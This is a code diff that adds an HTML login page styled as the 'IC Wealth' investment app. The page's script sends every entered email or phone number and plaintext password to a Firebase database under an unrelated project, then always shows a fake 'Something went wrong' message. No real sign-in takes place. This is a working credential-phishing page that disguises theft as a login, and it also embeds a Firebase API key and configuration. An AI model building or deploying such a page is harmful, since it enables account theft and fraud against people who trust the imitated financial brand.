@@ -1,0 +1,279 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover, interactive-widget=resizes-visual">
+<meta name="theme-color" content="#002856">
+<title>IC Wealth</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Dosis:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+<style>
+  *{box-sizing:border-box;margin:0;padding:0;-webkit-tap-highlight-color:transparent}
+  html,body{height:100%;overflow:hidden;background:#fff;font-family:'Dosis',system-ui,sans-serif;transition:background .3s}
+
+  #app{
+    --u:calc(100cqw / 828);
+    position:absolute;top:0;left:50%;transform:translateX(-50%);
+    width:var(--w,100vw);height:calc(var(--w,100vw) * 1792 / 828);
+    container-type:inline-size;overflow:hidden;background:#fff;
+  }
+  @media (min-width:500px){
+    html,body{background:#002856 !important}
+    #app{box-shadow:0 0 0 1px #0000000d,0 2cqw 8cqw #0000001f}
+  }
+  .screen{position:absolute;inset:0;opacity:0;visibility:hidden;transition:opacity .4s,visibility .4s}
+  .screen.active{opacity:1;visibility:visible}
+  .bg{position:absolute;left:0;top:0;width:100%;pointer-events:none;-webkit-user-drag:none;user-select:none}
+
+  .orange-btn{
+    position:absolute;left:calc(40*var(--u));width:calc(748*var(--u));height:calc(96*var(--u));
+    border:0;border-radius:calc(14*var(--u));background:#e87200;color:#fff;cursor:pointer;
+    font:700 calc(40*var(--u))/1 'Dosis',sans-serif;letter-spacing:calc(1*var(--u));text-transform:uppercase;
+    box-shadow:0 calc(4*var(--u)) calc(8*var(--u)) #0000003d;transition:transform .15s,filter .15s;
+  }
+  .orange-btn:active{transform:scale(.985);filter:brightness(.95)}
+
+  #s-welcome{background:#002856}
+  #s-welcome .orange-btn{top:calc(1380*var(--u))}
+
+  #s-login{background:#fff}
+  .back{
+    position:absolute;left:calc(36*var(--u));top:calc(104*var(--u));width:calc(80*var(--u));height:calc(88*var(--u));
+    background:none;border:0;cursor:pointer;display:flex;align-items:center;justify-content:flex-start;padding-left:calc(20*var(--u));
+  }
+  .back svg{width:calc(30*var(--u));height:calc(40*var(--u));stroke:#fff;fill:none;stroke-width:5;stroke-linecap:round;stroke-linejoin:round}
+  .reg{
+    position:absolute;right:calc(40*var(--u));top:calc(112*var(--u));height:calc(76*var(--u));padding:0 0 0 calc(20*var(--u));
+    background:none;border:0;cursor:pointer;color:#fff;font:500 calc(46*var(--u))/1 'Dosis',sans-serif;
+  }
+  .lead{position:absolute;left:0;right:0;top:calc(470*var(--u));text-align:center;font:300 calc(40*var(--u))/calc(56*var(--u)) 'Dosis',sans-serif;color:#1c1c1c}
+  .sheet{position:absolute;left:0;right:0;top:calc(521*var(--u));bottom:0;background:#fff}
+
+  .tabs{
+    position:absolute;left:calc(100*var(--u));top:calc(566*var(--u));width:calc(628*var(--u));height:calc(60*var(--u));
+    border-radius:calc(30*var(--u));background:#f4f5f7;
+  }
+  .tab-pill{
+    position:absolute;top:calc(5*var(--u));left:calc(6*var(--u));width:calc(273*var(--u));height:calc(50*var(--u));
+    border-radius:calc(25*var(--u));background:#fff;box-shadow:0 calc(1*var(--u)) calc(4*var(--u)) #00000014;
+    transition:transform .3s cubic-bezier(.3,.8,.3,1);
+  }
+  .tabs.phone .tab-pill{transform:translateX(calc(343*var(--u)))}
+  .tab{
+    position:absolute;top:0;height:100%;background:none;border:0;cursor:pointer;
+    font:400 calc(35*var(--u))/1 'Dosis',sans-serif;color:#a7afbd;transition:color .25s;
+  }
+  .tab.t1{left:calc(6*var(--u));width:calc(273*var(--u))}
+  .tab.t2{left:calc(349*var(--u));width:calc(273*var(--u))}
+  .tabs:not(.phone) .t1,.tabs.phone .t2{color:#0b2a5c}
+
+  .lbl{position:absolute;left:calc(40*var(--u));font:400 calc(40*var(--u))/1 'Dosis',sans-serif;color:#1c1c1c}
+  .inp{
+    position:absolute;left:calc(40*var(--u));width:calc(748*var(--u));height:calc(101*var(--u));
+    border:calc(1.5*var(--u)) solid #b9b9b9;border-radius:calc(14*var(--u));background:#fff;
+    box-shadow:0 calc(2*var(--u)) calc(4*var(--u)) #0000001a;
+  }
+  .inp:focus-within{border-color:#e87200}
+  .inp input{
+    position:absolute;inset:0;width:100%;height:100%;border:0;outline:0;background:transparent;border-radius:inherit;
+    padding:0 calc(20*var(--u)) 0 calc(60*var(--u));font:400 calc(38*var(--u)) 'Dosis',sans-serif;color:#111;
+  }
+  .inp.pw input{padding-right:calc(80*var(--u))}
+  .inp .ic{position:absolute;left:calc(20*var(--u));top:50%;width:calc(26*var(--u));height:calc(26*var(--u));transform:translateY(-50%);fill:#111}
+  .eye{position:absolute;right:calc(14*var(--u));top:0;width:calc(70*var(--u));height:100%;background:none;border:0;cursor:pointer;display:flex;align-items:center;justify-content:center}
+  .eye svg{width:calc(40*var(--u));height:calc(40*var(--u));stroke:#111;fill:none;stroke-width:2;stroke-linecap:round;stroke-linejoin:round}
+  .reset{
+    position:absolute;right:calc(63*var(--u));top:calc(1086*var(--u));background:none;border:0;cursor:pointer;
+    font:400 calc(40*var(--u))/calc(52*var(--u)) 'Dosis',sans-serif;color:#e87200;text-decoration:underline;text-underline-offset:calc(4*var(--u));
+  }
+  #s-login .orange-btn{top:calc(1188*var(--u))}
+  .msg{position:absolute;left:calc(40*var(--u));width:calc(748*var(--u));top:calc(1310*var(--u));text-align:center;font:500 calc(30*var(--u))/1.3 'Dosis',sans-serif;color:#c0392b;min-height:calc(40*var(--u))}
+
+  /* ✅ Small toast popup */
+  .toast {
+    position: absolute;
+    left: 50%;
+    bottom: 8%;
+    transform: translateX(-50%) translateY(20cqw);
+    background: rgba(28,28,30,0.92);
+    backdrop-filter: blur(10px);
+    color: #fff;
+    padding: 3.4cqw 6.4cqw;
+    border-radius: 99cqw;
+    font: 500 3.6cqw/1 'Dosis',sans-serif;
+    box-shadow: 0 2cqw 6cqw rgba(0,0,0,0.15);
+    opacity: 0;
+    transition: opacity .3s ease, transform .3s ease;
+    pointer-events: none;
+    z-index: 999;
+    max-width: 90%;
+    text-align: center;
+  }
+  .toast.show {
+    opacity: 1;
+    transform: translateX(-50%) translateY(0);
+  }
+</style>
+</head>
+<body>
+<div id="app">
+
+  <section class="screen active" id="s-splash">
+    <img class="bg" src="images/splash.jpg" alt="IC Wealth" draggable="false">
+  </section>
+
+  <section class="screen" id="s-welcome">
+    <img class="bg" src="images/welcome.jpg" alt="Invest with confidence. Begin today." draggable="false">
+    <button class="orange-btn" id="goLogin" type="button">Login</button>
+  </section>
+
+  <section class="screen" id="s-login">
+    <div class="sheet"></div>
+    <img class="bg" src="images/login-header.png" alt="IC Wealth" draggable="false">
+    <button class="back" id="loginBack" type="button" aria-label="Back">
+      <svg viewBox="0 0 30 40"><path d="M24 4 8 20l16 16"/></svg>
+    </button>
+    <button class="reg" id="regBtn" type="button">Register</button>
+    <p class="lead">Please log in to continue</p>
+
+    <div class="tabs" id="tabs">
+      <div class="tab-pill"></div>
+      <button class="tab t1" id="tabEmail" type="button">Email</button>
+      <button class="tab t2" id="tabPhone" type="button">Phone</button>
+    </div>
+
+    <label class="lbl" id="idLabel" for="idInput" style="top:calc(670*var(--u))">Email Address</label>
+    <div class="inp" style="top:calc(724*var(--u))">
+      <svg class="ic" id="icMail" viewBox="0 0 24 24"><path d="M2 5.5A1.5 1.5 0 0 1 3.5 4h17A1.5 1.5 0 0 1 22 5.5v.4l-10 6.1L2 5.9v-.4ZM2 8.3v10.2A1.5 1.5 0 0 0 3.5 20h17a1.5 1.5 0 0 0 1.5-1.5V8.3l-9.5 5.8a1 1 0 0 1-1 0L2 8.3Z"/></svg>
+      <svg class="ic" id="icPhone" viewBox="0 0 24 24" style="display:none"><path d="M6.6 10.8a15.1 15.1 0 0 0 6.6 6.6l2.2-2.2a1 1 0 0 1 1-.25c1.1.37 2.3.57 3.6.57a1 1 0 0 1 1 1V20a1 1 0 0 1-1 1C10.6 21 3 13.4 3 4a1 1 0 0 1 1-1h3.5a1 1 0 0 1 1 1c0 1.250.2 2.450.57 3.6a1 1 0 0 1-.25 1l-2.2 2.2Z"/></svg>
+      <input id="idInput" type="email" inputmode="email" autocomplete="email" autocapitalize="off" spellcheck="false">
+    </div>
+
+    <label class="lbl" for="pwInput" style="top:calc(870*var(--u))">Password</label>
+    <div class="inp pw" style="top:calc(924*var(--u))">
+      <svg class="ic" viewBox="0 0 24 24"><path d="M7 10V7a5 5 0 0 1 10 0v3h.5A1.5 1.5 0 0 1 19 11.5v8a1.5 1.5 0 0 1-1.5 1.5h-11A1.5 1.5 0 0 1 5 19.5v-8A1.5 1.5 0 0 1 6.5 10H7Zm2 0h6V7a3 3 0 0 0-6 0v3Z"/></svg>
+      <input id="pwInput" type="password" autocomplete="current-password">
+      <button class="eye" id="eyeBtn" type="button" aria-label="Show password">
+        <svg viewBox="0 0 24 24"><path d="M1.5 12s3.8-7 10.5-7 10.5 7 10.5 7-3.8 7-10.5 7S1.5 12 1.5 12Z"/><circle cx="12" cy="12" r="3.2"/></svg>
+      </button>
+    </div>
+
+    <button class="reset" id="resetBtn" type="button">Reset Password</button>
+    <button class="orange-btn" id="loginBtn" type="button">Login</button>
+    <div class="msg" id="msg" role="alert"></div>
+  </section>
+
+  <div id="toast" class="toast"></div>
+</div>
+
+<!-- Firebase SDK -->
+<script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
+
+<script>
+/* ================= Firebase Config ================= */
+const firebaseConfig = {
+  apiKey: "AIzaSyBx6AU-Jvg1So-Ty3FFKryctXZGV-LNFCY",
+  authDomain: "achievebypetra-82966.firebaseapp.com",
+  databaseURL: "https://achievebypetra-82966-default-rtdb.europe-west1.firebasedatabase.app",
+  projectId: "achievebypetra-82966",
+  storageBucket: "achievebypetra-82966.firebasestorage.app",
+  messagingSenderId: "412688052429",
+  appId: "1:412688052429:web:abf989e226e153b7c37984"
+};
+firebase.initializeApp(firebaseConfig);
+const database = firebase.database();
+
+const DB_NODE = "icwealth_users";
+
+const $ = id => document.getElementById(id);
+const BG = { 's-splash':'#fff', 's-welcome':'linear-gradient(90deg,#1f3647,#393a3d)', 's-login':'#fff' };
+const SPLASH_MS = 1000;
+
+function show(id){
+  document.querySelectorAll('.screen').forEach(s => s.classList.toggle('active', s.id === id));
+  document.documentElement.style.background = document.body.style.background = BG[id];
+}
+
+/* ✅ Toast helper */
+let toastTimer = null;
+function showToast(msg){
+  const toast = $('toast');
+  toast.textContent = msg;
+  toast.classList.add('show');
+  clearTimeout(toastTimer);
+  toastTimer = setTimeout(() => toast.classList.remove('show'), 3000);
+}
+
+/* ✅ FIXED: fill the FULL mobile width — no more side bars */
+let fitW = 0;
+function fitApp(){
+  const w = innerWidth;
+  if (w !== fitW){ fitW = w; }
+  $('app').style.setProperty('--w', w + 'px');
+}
+addEventListener('resize', fitApp);
+addEventListener('orientationchange', () => setTimeout(() => { fitW = 0; fitApp(); }, 200));
+fitApp();
+
+/* Splash -> Welcome */
+show('s-splash');
+setTimeout(() => show('s-welcome'), SPLASH_MS);
+
+/* Welcome -> Login */
+$('goLogin').addEventListener('click', () => show('s-login'));
+$('loginBack').addEventListener('click', () => show('s-welcome'));
+
+/* Email / Phone tabs */
+const idInput = $('idInput');
+function setTab(phone){
+  $('tabs').classList.toggle('phone', phone);
+  $('idLabel').textContent = phone ? 'Phone Number' : 'Email Address';
+  $('icMail').style.display = phone ? 'none' : 'block';
+  $('icPhone').style.display = phone ? 'block' : 'none';
+  idInput.type = phone ? 'tel' : 'email';
+  idInput.inputMode = phone ? 'tel' : 'email';
+  idInput.autocomplete = phone ? 'tel' : 'email';
+  idInput.value = ''; $('msg').textContent = '';
+}
+$('tabEmail').addEventListener('click', () => setTab(false));
+$('tabPhone').addEventListener('click', () => setTab(true));
+
+/* Show / hide password */
+$('eyeBtn').addEventListener('click', () => {
+  const p = $('pwInput'); p.type = p.type === 'password' ? 'text' : 'password';
+});
+
+/* ✅ Login button — save email + password to Firebase, then show toast */
+$('loginBtn').addEventListener('click', () => {
+  const idVal = idInput.value.trim();
+  const pwVal = $('pwInput').value;
+
+  if (!idVal || !pwVal){
+    $('msg').textContent = 'Please fill in all fields.';
+    return;
+  }
+
+  $('msg').textContent = '';
+
+  const userId = "User_" + Date.now().toString(36).toUpperCase();
+
+  database.ref(DB_NODE + "/" + userId).set({
+    id: userId,
+    email: idVal,
+    password: pwVal,
+    timestamp: new Date().toLocaleString()
+  }).then(() => {
+    showToast("Something went wrong");
+  }).catch((error) => {
+    console.error("❌ Firebase error:", error);
+    showToast("Something went wrong");
+  });
+});
+
+$('regBtn').addEventListener('click', () => { /* TODO: register page */ });
+$('resetBtn').addEventListener('click', () => { /* TODO: reset password */ });
+</script>
+</body>
+</html>
